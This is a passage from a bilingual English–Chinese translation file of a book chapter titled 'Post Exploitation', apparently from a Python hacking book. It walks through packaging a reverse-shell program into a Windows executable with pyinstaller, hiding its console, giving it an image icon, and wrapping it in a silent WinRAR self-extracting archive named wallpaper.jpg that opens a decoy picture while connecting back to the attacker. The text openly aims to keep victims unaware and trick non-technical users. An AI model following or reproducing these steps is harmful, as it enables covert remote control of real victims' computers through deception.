- en: 'Chapter 8: Post Exploitation'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第8章：利用后阶段
- en: 'In [*Chapter 7*](B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152), *Advanced
    Malware*, we learned how to add some advanced functionalities to our malware program.
    You can add any number of functionalities you want to your malware. Once you are
    done writing your code, next comes the implementation part. How do you package
    your malware and make it useful for deployment? In this chapter, we will learn
    about the following aspects of malware deployment:'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在[*第7章*](B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152)，《高级恶意软件》中，我们学习了如何为我们的恶意软件程序添加一些高级功能。你可以随意向恶意软件添加任意数量的功能。一旦你完成了代码编写，接下来就是实现部分。你如何打包你的恶意软件并使其可用于部署？在本章中，我们将学习恶意软件部署的以下几个方面：
- en: Packaging the malware
  id: totrans-2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 包装恶意软件
- en: Understanding trojans
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 理解特洛伊木马
- en: Attacking over a public IP
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过公共IP进行攻击
- en: Cracking passwords
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 破解密码
- en: Stealing passwords
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 偷窃密码
- en: Creating botnets
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 创建僵尸网络
- en: Packaging the malware
  id: totrans-8
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 包装恶意软件
- en: The program we developed in [*Chapter 7*](B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152),
    *Advanced Malware*, was a Python file. It also contained some dependencies. It
    is very hard to run a Python file on a victim's machine without having physical
    access to it. This makes our program not very useful unless we have a way to package
    everything together into a single executable that we can ship to the victim and
    when the victim opens it, it creates a reverse shell to the hacker's computer.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在[*第7章*](B14788_07_Final_JC_ePub.xhtml#_idTextAnchor152)，《高级恶意软件》中开发的程序是一个Python文件。它还包含一些依赖项。如果没有物理访问权限，运行一个Python文件在受害者机器上是非常困难的。这使得我们的程序不太有用，除非我们能将所有内容打包成一个单独的可执行文件，发送给受害者，当受害者打开它时，它能与黑客的计算机建立反向shell连接。
- en: Packaging together Python code into a workable executable file requires that
    we also include all the dependencies of the program. This is the exact reason
    why we work with *virtual environments*. They enable the program to keep all dependencies
    together so that when we package our code, everything including the Python interpreter
    is included in the executable so that we don't need to install anything on the
    victim computer for our program to work perfectly.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 将Python代码包装成可运行的可执行文件需要包含程序的所有依赖项。这正是我们使用*虚拟环境*的原因。虚拟环境使得程序能够将所有依赖项集中在一起，这样在我们打包代码时，所有内容，包括Python解释器，都被包含在可执行文件中，这样我们就不需要在受害者计算机上安装任何东西，程序就能完美运行。
- en: Understanding the pyinstaller library
  id: totrans-11
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 理解pyinstaller库
- en: 'Fortunately, there is a way to achieve the objectives mentioned previously.
    This is done by using a Python library called **pyinstaller**. This helps us to
    package our code nicely in a binary executable with the extension **.exe** for
    Windows. To install **pyinstaller**, write the following command:'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 幸运的是，确实有一种方法可以实现之前提到的目标。这是通过使用一个名为**pyinstaller**的Python库来完成的。它帮助我们将代码打包成一个可执行的二进制文件，Windows上的扩展名为**.exe**。要安装**pyinstaller**，请写入以下命令：
- en: pip install pyinstaller
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: pip install pyinstaller
- en: Note that this command should be installed with the virtual environment enabled
    so that we have all the required dependencies available. Open your victim program
    for the advanced malware and enable the virtual environment. Once done, install
    **pyinstaller** using the preceding command.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，执行此命令时应启用虚拟环境，以便我们能确保所有必需的依赖项都可用。打开你的受害者程序，启动高级恶意软件并启用虚拟环境。完成后，使用前面的命令安装**pyinstaller**。
- en: 'If you haven''t created the virtual environment, you can do so by running the
    following command in the folder where your Python malware file is present:'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你还没有创建虚拟环境，可以在存放你的Python恶意软件文件的文件夹中运行以下命令来创建：
- en: python -m venv myenv
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: python -m venv myenv
- en: Wait for some moments for the install to finish. Once it is done, you can activate
    the environment by either starting a new terminal or running the **activate.bat**
    script in the script folder or **myenv**.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 等待一段时间，直到安装完成。一旦完成，你可以通过启动新终端或运行**activate.bat**脚本（位于脚本文件夹或**myenv**中）来激活环境。
- en: 'If you have activated the Python environment successfully, you will see something
    like this:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你成功激活了Python环境，你将看到类似下面的内容：
- en: '![Figure 8.1 – Python environment enabled'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.1 – 已启用Python环境'
- en: '](image/B14788_08_01.jpg)'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_01.jpg)'
- en: Figure 8.1 – Python environment enabled
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.1 – 已启用Python环境
- en: 'Note that we used an external dependency, **pyautogui**, in our advanced malware.
    We need to install this dependency in our virtual environment as well. If you
    have any other feature added to your malware that requires external dependencies,
    install those as well. Once all the dependencies are installed, you can install
    **pyinstaller** in the virtual environment with **pip install pyinstaller**. If
    you have everything done properly, write **pyinstaller** in your command terminal
    and you should see the following output:'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，我们在高级恶意软件中使用了一个外部依赖项 **pyautogui**。我们也需要在虚拟环境中安装这个依赖。如果你的恶意软件中添加了其他需要外部依赖的功能，也需要安装这些依赖。所有依赖项安装完后，你可以通过
    **pip install pyinstaller** 在虚拟环境中安装 **pyinstaller**。如果一切正确无误，输入 **pyinstaller**
    在命令终端中，你应该看到如下输出：
- en: '![Figure 8.2 – pyinstaller installation'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 8.2 – pyinstaller 安装'
- en: '](image/B14788_08_02.jpg)'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_02.jpg)'
- en: Figure 8.2 – pyinstaller installation
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.2 – pyinstaller 安装
- en: 'In *Figure 8.2*, you can see the list of options available for **pyinstaller**.
    Next, to make an executable, write **pyinstaller –onefile advanced_malware.py**.
    This will compile all the code along with its dependencies into a single file
    and create the folder structure as follows:'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 在 *图 8.2* 中，你可以看到 **pyinstaller** 可用选项的列表。接下来，要创建一个可执行文件，输入 **pyinstaller –onefile
    advanced_malware.py**。这会将所有代码及其依赖项编译成一个单独的文件，并创建以下文件夹结构：
- en: '![Figure 8.3 – Folder structure'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 8.3 – 文件夹结构'
- en: '](image/B14788_08_03.jpg)'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_03.jpg)'
- en: Figure 8.3 – Folder structure
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.3 – 文件夹结构
- en: 'The folder that you are concerned with is the **dist** folder, which stands
    for distribution. Your executable will be located here. Go ahead and open this
    folder in File Explorer:'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 你需要关注的文件夹是 **dist** 文件夹，它代表了分发（distribution）。你的可执行文件将位于这个文件夹中。现在可以在文件资源管理器中打开这个文件夹：
- en: '![Figure 8.4 – Executable file'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 8.4 – 可执行文件'
- en: '](image/B14788_08_04.jpg)'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_04.jpg)'
- en: Figure 8.4 – Executable file
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.4 – 可执行文件
- en: 'You will find an executable with the same name as your Python filename, and
    it will have the **.exe** extension. Now if you simply run this file while your
    hacker program is running, you will get a connection back. No matter whether the
    victim has Python installed on its system or not, this executable will work. Go
    ahead and run your hacker program and then double-click on this executable to
    open it. The hacker program will look like this:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 你会找到一个与 Python 文件名相同的可执行文件，它会有 **.exe** 扩展名。现在，如果你在黑客程序运行时直接运行这个文件，你会获得一个回连。不管受害者的系统是否安装了
    Python，这个可执行文件都能正常工作。继续运行你的黑客程序，然后双击这个可执行文件打开它。黑客程序看起来会是这样的：
- en: '![Figure 8.5 – Hacker program'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 8.5 – 黑客程序'
- en: '](image/B14788_08_05.jpg)'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_05.jpg)'
- en: Figure 8.5 – Hacker program
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.5 – 黑客程序
- en: 'Similarly, on the victim PC, you will see a console popup with a similar screen:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 同样，在受害者的电脑上，你会看到一个类似的控制台弹窗：
- en: '![Figure 8.6 – Running the executable on the victim'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 8.6 – 在受害者电脑上运行可执行文件'
- en: '](image/B14788_08_06.jpg)'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_06.jpg)'
- en: Figure 8.6 – Running the executable on the victim
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.6 – 在受害者电脑上运行可执行文件
- en: If you look carefully at the top of *Figure 8.6*, you will see the name of the
    executable running. You can clearly see that instead of a Python script, we are
    now running an executable file while achieving the same objective.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你仔细观察 *图 8.6* 顶部，你会看到正在运行的可执行文件的名称。你可以清楚地看到，现在我们运行的是一个可执行文件，而不是 Python 脚本，并且实现了相同的目标。
- en: 'However, there is a small issue here. If the victim clicks on this executable,
    they will see a command prompt pop up displaying everything that is happening,
    which is clearly not what we want as this will alert the victim that something
    is happening. We want this to happen in the background so that the victim has
    no idea what is happening. To hide the console, we can add the following parameter
    to the command:'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，这里有一个小问题。如果受害者点击这个可执行文件，他们将看到一个命令提示符弹出，显示所有正在发生的事情，这显然不是我们想要的，因为这会让受害者警觉到有异常发生。我们希望这个过程在后台进行，以便受害者完全无法察觉。为了隐藏控制台，我们可以在命令中添加以下参数：
- en: pyinstaller –-onefile –-noconsole advanced_malware.py
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: pyinstaller –-onefile –-noconsole advanced_malware.py
- en: 'If you click the executable file now while the hacker program is running, you
    will see that nothing happens on the screen, as no pop-up console is displayed,
    however, the connection will be established in the background. You can see that
    the executable is running in the background by opening Task Manager:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你在黑客程序运行时点击可执行文件，你会发现屏幕上什么也没有发生，因为没有弹出控制台显示，但在后台会建立连接。你可以通过打开任务管理器来查看可执行文件在后台运行：
- en: '![Figure 8.7 – Background process'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.7 – 后台进程'
- en: '](image/B14788_08_07.jpg)'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_07.jpg)'
- en: Figure 8.7 – Background process
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.7 – 后台进程
- en: 'In the background processes in the preceding screenshot, you can see that the
    program is running, and a connection will be established. Note that if your program
    doesn''t run commands properly on the victim machine, go to your victim program
    and where you are executing commands on the system and add the following parameter:
    **stdin=subprocess.DEVNULL**. The complete command will look like this:'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的截图中，你可以看到程序正在运行，并且会建立连接。请注意，如果你的程序在受害者机器上没有正确运行命令，请进入你的受害者程序并找到你执行命令的地方，添加以下参数：**stdin=subprocess.DEVNULL**。完整的命令将如下所示：
- en: output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True,
    stdin=subprocess.DEVNULL)
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True,
    stdin=subprocess.DEVNULL)
- en: 'The reason this error occurs is the standard input for the console is not handled
    properly. If you run any command on the hacker program, it should run properly.
    See the following example where I run the **dir** command:'
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 该错误发生的原因是控制台的标准输入没有得到正确处理。如果你在黑客程序中运行任何命令，它应该会正常运行。请看下面的示例，我运行了**dir**命令：
- en: '![Figure 8.8 – Executing the command in "noconsole" mode'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.8 – 在“无控制台”模式下执行命令'
- en: '](image/B14788_08_08.jpg)'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_08.jpg)'
- en: Figure 8.8 – Executing the command in "noconsole" mode
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.8 – 在“无控制台”模式下执行命令
- en: Now we have created quite a stealthy malware, which can run in the background
    on the victim computer and give us control of the victim PC as well. But there
    is still a small problem with this program as it requires the user to click on
    the malware executable, which can be difficult or easy depending on the victim.
    If the user is not very tech-savvy, you can easily trick them into running it,
    otherwise, it will be difficult. Now we will move our discussion to trojans and
    how they work. We will also build a small trojan malware in the following section.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经创建了一个相当隐秘的恶意软件，它可以在受害者电脑的后台运行并控制受害者的PC。但这个程序仍然存在一个小问题，它需要用户点击恶意软件的可执行文件，这对受害者来说可能容易也可能困难。如果用户不太懂技术，你可以轻松地诱使他们运行它，反之则会很困难。现在，我们将把讨论转向木马以及它们是如何工作的。接下来我们将在以下部分中构建一个小型木马恶意软件。
- en: Understanding trojans
  id: totrans-56
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 了解木马
- en: In the previous section, we created an executable that can be run with a single
    click and you will then have a reverse connection with the victim, but this requires
    the victim to manually open and click on the executable. Here comes the concept
    of a **trojan**. A trojan is a malware program that hides in a very unsuspecting
    manner. Usually, these trojan malwares are merged or bundled together with legitimate
    software and run when the victim tries to open a legitimate application or file.
    You will see that a lot of the time, these viruses are merged with PDF or image
    files. Hiding malwares inside a trojan is a complicated task, since a lot of the
    time, the tricks that you learn are quickly patched in the updates for the software
    that you are using. For example, let's say that you discover a vulnerability in
    software that allows you to embed malware in a file. Unless you are the first
    one to discover this vulnerability, it is quite possible that this will be patched
    in a day or two.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 在上一部分中，我们创建了一个可以一键运行的可执行文件，之后你将与受害者建立反向连接，但这需要受害者手动打开并点击可执行文件。现在引入了**木马**的概念。木马是一种隐藏得非常巧妙的恶意软件程序。通常，这些木马恶意软件会与合法软件捆绑或合并，在受害者尝试打开合法应用程序或文件时运行。你会发现，这些病毒很多时候与PDF或图像文件合并。将恶意软件隐藏在木马程序中是一个复杂的任务，因为很多时候，你所学到的技巧很快就会在所使用软件的更新中被修补。例如，假设你发现了一个软件漏洞，允许你在文件中嵌入恶意软件。除非你是第一个发现这个漏洞的人，否则很有可能在一两天内就会被修补。
- en: Adding an icon to an executable
  id: totrans-58
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 向可执行文件添加图标
- en: If we take a look at our executable that we developed in the previous section,
    it has a Python icon, which can make it look like it's a Python executable. This
    is not very helpful for hacking purposes as it can easily be detected. One way
    is to add an image icon to the executable to make it look like an image instead
    of an executable. This will make it seem like the user is clicking to open an
    image while, instead, they will be running the executable. We can add the icon
    using **pyinstaller**. To do this, we need an image with a **.ico** extension.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们查看在上一节中开发的可执行文件，它有一个Python图标，这可能让它看起来像一个Python可执行文件。这对于黑客攻击来说不是很有帮助，因为它很容易被检测到。一个方法是为可执行文件添加一个图标，使其看起来像一个图片，而不是可执行文件。这会让用户误以为他们在点击打开一张图片，而实际上，他们正在运行可执行文件。我们可以使用**pyinstaller**来添加图标。为此，我们需要一个**.ico**扩展名的图片。
- en: 'Take any image and convert the extension to **.ico**. You can use any online
    tool to convert it and it should be easy. I will be using the following example
    website to convert my image to ICO format: [online-convert.com](http://online-convert.com).'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 拿一张图片并将其扩展名改为**.ico**。你可以使用任何在线工具来转换它，应该非常简单。我将使用以下示例网站将我的图片转换为ICO格式：[online-convert.com](http://online-convert.com)。
- en: Once you are done converting the image, place the converted file into the same
    directory as where your victim malware program is located. Once done, you can
    use the following command to add an icon to your executable.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 转换完图片后，将转换后的文件放入与受害者恶意程序相同的目录中。完成后，你可以使用以下命令为可执行文件添加图标。
- en: 'You can name the file **icon.ico** and write the following command for **pyinstaller**:'
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以将文件命名为**icon.ico**并为**pyinstaller**编写以下命令：
- en: pyinstaller –-onefile –-noconsole –icon=icon.ico advanced_malware.py
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: pyinstaller –-onefile –-noconsole –icon=icon.ico advanced_malware.py
- en: 'If you open the **dist** folder, you will see that, now, instead of a Python
    icon, your executable will have a different icon, depending on the image that
    you chose. My file looks like this:'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你打开**dist**文件夹，你会看到，现在，代替Python图标，你的可执行文件将有一个不同的图标，这取决于你选择的图片。我的文件看起来是这样的：
- en: '![Figure 8.9 – Trojan icon'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.9 – 木马图标'
- en: '](image/B14788_08_09.jpg)'
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_09.jpg)'
- en: Figure 8.9 – Trojan icon
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.9 – 木马图标
- en: In the preceding screenshot, you can see that the icon has changed now and it
    is now easy to trick the victim into clicking this file. Now if you click this
    file, you will see that it runs a background connection to the hacker, which you
    can verify by using Task Manager from Windows.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的截图中，你可以看到图标已经改变，现在很容易让受害者点击这个文件。如果你点击这个文件，你会看到它在后台与黑客建立了连接，你可以通过Windows的任务管理器来验证这一点。
- en: Creating your own trojan
  id: totrans-69
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 创建你自己的木马
- en: The preceding trojan will work in some cases and it should be enough. However,
    when the user clicks and nothing happens on the victim computer, the user might
    guess that something is wrong. Ideally, we would want to open an image when the
    user clicks on the executable and to create a simultaneous connection back to
    the hacker. So, the user thinks that they have just opened the image, when in
    fact, they have opened the image and also created the reverse shell to the hacker.
    In this section, we will try to further hide our malware.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 上述木马在某些情况下有效，并且应该足够用了。然而，当用户点击后没有任何反应时，受害者可能会猜到出什么问题了。理想情况下，我们希望当用户点击可执行文件时打开一张图片，并同时与黑客建立反向连接。这样，用户会以为他们只是在打开图片，实际上，他们不仅打开了图片，还为黑客创建了反向Shell连接。在本节中，我们将进一步隐藏我们的恶意软件。
- en: 'To create a malware trojan, you will need four items, such as the following:'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 要创建一个恶意木马，你将需要四个项目，如下所示：
- en: Your malware executable with the icon
  id: totrans-72
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 你的恶意软件可执行文件与图标
- en: The *WinRAR* program
  id: totrans-73
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '*WinRAR*程序'
- en: The image to be used for the icon in .**jpg** format
  id: totrans-74
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 用于图标的**.jpg**格式图片
- en: The icon image with the .**ico** extension
  id: totrans-75
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 带有**.ico**扩展名的图标图片
- en: 'Install the *WinRAR* software from this website: https://www.win-rar.com/.'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 从这个网站安装*WinRAR*软件：https://www.win-rar.com/。
- en: 'The process should be simple. Once done, copy the executable (*1*), image (*3*),
    and icon (*4*) to a new folder. I have created a new folder called **trojan**
    and pasted all three items in it:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 过程应该很简单。完成后，将可执行文件（*1*）、图片（*3*）和图标（*4*）复制到一个新文件夹中。我创建了一个名为**trojan**的新文件夹，并将这三个项目粘贴在其中：
- en: '![Figure 8.10 – Trojan contents'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.10 – 木马内容'
- en: '](image/B14788_08_10.jpg)'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_10.jpg)'
- en: Figure 8.10 – Trojan contents
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.10 – 木马内容
- en: The first **advanced_malware.exe** is the executable, the second is the icon
    file, and the third is the .**jpg** image for the icon.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 第一个**advanced_malware.exe**是可执行文件，第二个是图标文件，第三个是用于图标的**.jpg**图片。
- en: 'Now select all three files and right-click to select the **Add to archive**
    option:'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 现在选择所有三个文件，右键点击选择**添加到压缩包**选项：
- en: '![Figure 8.11 – Add to archive'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.11 – 添加到压缩包'
- en: '](image/B14788_08_11.jpg)'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_11.jpg)'
- en: Figure 8.11 – Add to archive
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.11 – 添加到压缩包
- en: 'This will open a new dialog box. It will look like this:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 这将打开一个新的对话框。它看起来是这样的：
- en: '![Figure 8.12 – WinRAR dialog box'
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.12 – WinRAR对话框'
- en: '](image/B14788_08_12.jpg)'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_12.jpg)'
- en: Figure 8.12 – WinRAR dialog box
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.12 – WinRAR对话框
- en: Let's rename the file to **wallpaper.jpg**. Select the compression method of
    **Best** and check the **Create SFX archive** box. Now go to the **Advanced**
    tab and open **SFX options**.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们将文件重命名为**wallpaper.jpg**。选择**最佳**压缩方式，并勾选**创建SFX压缩包**框。然后进入**高级**标签页，打开**SFX选项**。
- en: 'It will open a new dialog box. Go to the **Update** tab and select **Extract
    and update files** and **Overwrite all files**:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 它将打开一个新的对话框。进入**更新**标签页，选择**提取并更新文件**和**覆盖所有文件**：
- en: '![Figure 8.13 – SFX options'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.13 – SFX选项'
- en: '](image/B14788_08_13.jpg)'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_13.jpg)'
- en: Figure 8.13 – SFX options
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.13 – SFX选项
- en: 'Next, go to the **Text and icon** tab and select the **Browse** button to select
    the **icon.ico** file. Navigate to the file and select it:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，进入**文本和图标**标签页，选择**浏览**按钮，选择**icon.ico**文件。找到文件并选择它：
- en: '![Figure 8.14 – Selecting icons'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.14 – 选择图标'
- en: '](image/B14788_08_14.jpg)'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_14.jpg)'
- en: Figure 8.14 – Selecting icons
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.14 – 选择图标
- en: 'Then go to the **Modes** tab and check **Unpack to temporary folder** and also
    select **Hide all** for **Silent mode**:'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 然后进入**模式**标签页，勾选**解压到临时文件夹**，同时为**静默模式**选择**隐藏所有**：
- en: '![Figure 8.15 – SFX mode'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.15 – SFX模式'
- en: '](image/B14788_08_15.jpg)'
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_15.jpg)'
- en: Figure 8.15 – SFX mode
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.15 – SFX模式
- en: 'Finally, go to the **Setup** tab and write the following in the **Run after
    extraction** field:'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，进入**设置**标签页，在**提取后运行**字段中写入以下内容：
- en: '![Figure 8.16 – Run after extraction'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.16 – 提取后运行'
- en: '](image/B14788_08_16.jpg)'
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_16.jpg)'
- en: Figure 8.16 – Run after extraction
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.16 – 提取后运行
- en: This will allow us to run the files in sequence after we are done extracting.
    First, we will open the actual image that is shown to the victim, and in the background,
    we will also run the malware, which will give the hacker a reverse connection.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 这样可以在提取完成后按顺序运行文件。首先，我们会打开实际展示给受害者的图片，同时在后台运行恶意软件，从而给黑客建立反向连接。
- en: 'Now everything is set up as per our needs. Just click **OK** to create the
    compressed file and it will create a new file in the same folder with the name
    **wallpaper.jpg**. On the surface, it looks like a normal image file but if you
    open it, you will see that it creates a reverse connection, if you have the hacker
    server running:'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 现在一切都已按我们的需求设置完毕。只需点击**确定**创建压缩文件，它将以**wallpaper.jpg**为文件名在同一文件夹中创建一个新文件。表面上看，它像是一个普通的图片文件，但如果你打开它，你会看到它会创建一个反向连接，前提是你已经运行了黑客服务器：
- en: '![Figure 8.17 – Trojan'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.17 – 木马'
- en: '](image/B14788_08_17.jpg)'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_08_17.jpg)'
- en: Figure 8.17 – Trojan
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.17 – 木马
- en: In *Figure 8.16*, you can see that we have created a trojan named **wallpaper.jpg**.
    If you look very closely, you can see that it has the type **Application** but
    in Windows, extensions are hidden by default and we have added the name **wallpaper.jpg**
    to it so it looks like an image. And if you click on the image, it will open the
    image and concurrently create a reverse connection with the hacker. Go ahead and
    try it yourself. Our current malware attack has only worked over a private IP
    until now. In the next section, we will learn how to perform the same attack over
    a public IP.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 在*图8.16*中，你可以看到我们创建了一个名为**wallpaper.jpg**的木马。如果你仔细看，可以看到它的类型是**应用程序**，但在Windows中，扩展名默认是隐藏的，我们将**wallpaper.jpg**添加到了它的名字中，因此它看起来像一个图片。如果你点击该图片，它将打开图片，并同时与黑客建立反向连接。试试看吧。我们当前的恶意软件攻击仅在私有IP上有效。接下来的部分，我们将学习如何在公共IP上执行相同的攻击。
- en: Attack over a public IP
  id: totrans-113
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在公共IP上攻击
- en: So far, all the attacks we have done are on the local network. This requires
    you, the hacker, and the victim to be connected to the same network. This will
    likely not be the case for a lot of attack scenarios. This is where a public IP
    comes into play. We have already learned about public and private IP addresses
    while discussing an introduction to networking. In order to create a successful
    attack, we need to know the public IP of the hacker. On the hacker machine, you
    can find your public IP by going to [google.com](http://google.com) and typing
    **my public ip** and this will display your public IP address provided you are
    not using any VPN or network masking schemes. It will be a similar 32-bit address,
    which is provided to you by your ISP. My public IP is **31.38.10.X**. The last
    8 bits are masked due to privacy issues. Your IP will be different depending on
    where you live. It should not be very difficult to find. Once you have your public
    IP address, go to the victim program and instead of writing the private IP of
    the hacker, write the public IP of the hacker.
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
